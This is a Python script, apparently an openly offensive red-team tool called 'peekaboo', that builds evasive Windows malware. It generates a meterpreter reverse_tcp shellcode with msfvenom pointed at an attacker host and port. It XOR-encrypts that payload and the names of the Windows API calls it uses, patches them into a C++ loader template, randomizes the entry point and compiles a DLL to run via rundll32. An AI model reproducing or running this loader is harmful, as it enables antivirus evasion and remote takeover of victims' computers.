# payload encryption functions
import argparse
import subprocess
import sys
import random
from Crypto.Cipher import AES
import os
import hashlib
import string

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class PeekabooEncryptor():
    def __init__(self):
        self.AES_KEY = os.urandom(16)
        self.XOR_KEY = self.random()

    def pad(self, s):
        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

    def aes(self, plaintext):
        k = hashlib.sha256(self.AES_KEY).digest()
        iv = 16 * '\x00'
        plaintext = self.pad(plaintext)
        cipher = AES.new(k, AES.MODE_CBC, iv)
        return cipher.encrypt(bytes(plaintext))

    def aes_encrypt(self, data):
        ciphertext = self.aes(data)
        key = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in self.AES_KEY) + ' };'
        ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
        return ciphertext, key

    def xor(self, data):
        key = str(self.XOR_KEY)
        l = len(key)
        output_str = ""

        for i in range(len(data)):
            current = data[i]
            current_key = key[i % len(key)]
            output_str += chr(ord(current) ^ ord(current_key))

        return output_str

    def xor_encrypt(self, data):
        ciphertext = self.xor(data)
        ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
        return ciphertext, self.XOR_KEY

    def random(self):
        length = random.randint(16, 32)
        return ''.join(random.choice(string.ascii_letters) for i in range(length))

def generate_payload(host, port):
    print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
    msfv = "msfvenom -p windows/x64/meterpreter/reverse_tcp"
    msfv += " LHOST=" + host
    msfv += " LPORT=" + port
    msfv += " -f raw"
    msfv += " -o /tmp/hack.bin"
    print (Colors.YELLOW + msfv + Colors.ENDC)
    try:
        p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
        p.wait()
        print (Colors.GREEN + "reverse shell payload successfully generated :)" + Colors.ENDC)
    except Exception as e:
        print (Colors.RED + "generate payload failed :(" + Colors.ENDC)
        sys.exit()

def run_peekaboo(host, port):
    banner = """
    #####  ###### #    #         ##         #####   ####   ####  
    #    # #      #   #         #  #        #    # #    # #    # 
    #    # #####  ####   ##### #    # ##### #####  #    # #    # 
    #####  #      #  #         ######       #    # #    # #    # 
    #      #      #   #        #    #       #    # #    # #    # 
    #      ###### #    #       #    #       #####   ####   ####  
    by @cocomelonc, many thanks to:
    https://institute.sektor7.net/red-team-operator-malware-development-essentials
    """
    print (Colors.BLUE + banner + Colors.ENDC)
    # generate_payload(host, port)
    encryptor = PeekabooEncryptor()
    print (Colors.BLUE + "read payload..." + Colors.ENDC)
    # plaintext = open("/tmp/hack.bin", "rb").read()
    plaintext = open("./calc.bin", "rb").read()

    f_va = "VirtualAlloc"
    f_vp = "VirtualProtect"
    f_cth = "CreateThread"
    f_wfso = "WaitForSingleObject"
    f_rce = "RunRCE"

    print (Colors.BLUE + "encrypt..." + Colors.ENDC)
    # ciphertext, p_key = encryptor.aes_encrypt(plaintext)
    f_rce = encryptor.random()
    ciphertext, p_key = encryptor.xor_encrypt(plaintext)
    ciphertext_va, va_key = encryptor.xor_encrypt(f_va)
    ciphertext_vp, vp_key = encryptor.xor_encrypt(f_vp)
    ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth)
    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso)

    tmp = open("peekaboo.cpp", "rt")
    data = tmp.read()

    data = data.replace('unsigned char my_payload[] = { };', 'unsigned char my_payload[] = ' + ciphertext)
    data = data.replace('unsigned char s_va[] = { };', 'unsigned char s_va[] = ' + ciphertext_va)
    data = data.replace('unsigned char s_vp[] = { };', 'unsigned char s_vp[] = ' + ciphertext_vp)
    data = data.replace('unsigned char s_ct[] = { };', 'unsigned char s_ct[] = ' + ciphertext_cth)
    data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)

    # data = data.replace('char my_payload_key[] = { };', 'char my_payload_key[] = ' + p_key)
    data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
    data = data.replace('char f_key[] = "";', 'char f_key[] = "' + va_key + '";')
    data = data.replace('RunRCE', f_rce)

    tmp.close()
    tmp = open("peekaboo-enc.cpp", "w+")
    tmp.write(data)
    tmp.close()

    try:
        os.system("x86_64-w64-mingw32-g++ -shared -o peekaboo.dll peekaboo-enc.cpp -fpermissive >/dev/null 2>&1")
    except:
        print (Colors.RED + "error compiling template :(" + Colors.ENDC)
        sys.exit()
    else:
        print (Colors.GREEN + "successfully compiled :)" + Colors.ENDC)
        print (Colors.GREEN + "rundll32 .\peekaboo.dll, " + f_rce)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--lhost', required = True, help = "local IP")
    parser.add_argument('-p','--lport', required = True, help = "local port", default = '4444')
    args = vars(parser.parse_args())
    host, port = args['lhost'], args['lport']
    run_peekaboo(host, port)
